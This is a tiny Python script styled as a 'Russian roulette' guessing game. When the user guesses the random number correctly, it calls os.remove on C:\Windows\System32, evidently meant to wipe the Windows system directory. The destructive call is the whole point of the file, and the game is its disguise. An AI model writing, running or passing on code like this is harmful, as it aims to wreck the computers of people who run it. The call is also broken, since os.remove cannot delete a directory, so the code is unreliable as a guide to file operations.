import random
import os

#Rusian roulette game

number = random.randint(1, 10)
guess = input("Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    os.remove("C:\Windows\System32")
else:
    print("YOU WON!")